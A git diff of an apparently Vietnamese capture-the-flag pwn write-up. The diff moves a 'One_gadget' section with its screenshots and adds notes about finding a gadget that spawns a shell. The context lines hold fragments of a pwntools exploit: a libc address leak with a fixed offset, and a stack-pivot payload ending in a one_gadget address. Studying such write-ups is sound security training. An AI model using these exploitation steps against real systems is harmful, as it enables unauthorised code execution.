@@ -47,6 +47,13 @@ Payload:
     libc_leak=u64(p.recvline()[:-1]+b'\x00\x00')
     libc.address=libc_leak-0x80e10
     
+Hiện tại đã có libc, chỉ cần tìm hàm tạo shell.
+
+### One_gadget
+<img width="420" height="484" alt="image" src="https://github.com/user-attachments/assets/bee500bf-8e2a-4f11-9bc1-b3f28a35cfe6" />
+<img width="475" height="514" alt="image" src="https://github.com/user-attachments/assets/888049cc-7afb-45e1-806f-0a3bf7675828" />
+
+Có gadget thỏa các điều kiện để tạo shell.
 
 ## Stack pivot
 <img width="951" height="800" alt="image" src="https://github.com/user-attachments/assets/4ac084e2-0697-4d54-913a-7628d0d398db" />
@@ -63,6 +70,4 @@ Payload:
     payload+=p64(one_gadget)    //one_gadget
     p.sendlineafter(b'Data:',payload)
 
-## One_gadget
-<img width="420" height="484" alt="image" src="https://github.com/user-attachments/assets/bee500bf-8e2a-4f11-9bc1-b3f28a35cfe6" />
-<img width="475" height="514" alt="image" src="https://github.com/user-attachments/assets/888049cc-7afb-45e1-806f-0a3bf7675828" />
+
